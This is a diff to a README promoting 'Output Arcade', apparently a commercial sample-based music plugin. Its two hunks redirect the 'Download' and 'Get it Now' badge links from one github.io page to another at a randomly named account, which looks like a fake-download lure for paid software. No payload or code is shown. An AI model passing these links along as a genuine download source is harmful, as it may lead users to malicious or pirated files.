@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://poxmell.github.io/.github/outputArcade">
+  <a href="https://jjfhjfk3858.github.io/.github/outputArcade">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Output Arcade"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The subscription content model addresses a genuine problem in sample-based produ
 
 <p align="center">
 
-[![Get it Now Output Arcade](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://poxmell.github.io/.github/outputArcade)
+[![Get it Now Output Arcade](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://jjfhjfk3858.github.io/.github/outputArcade)
 
 </p>
 
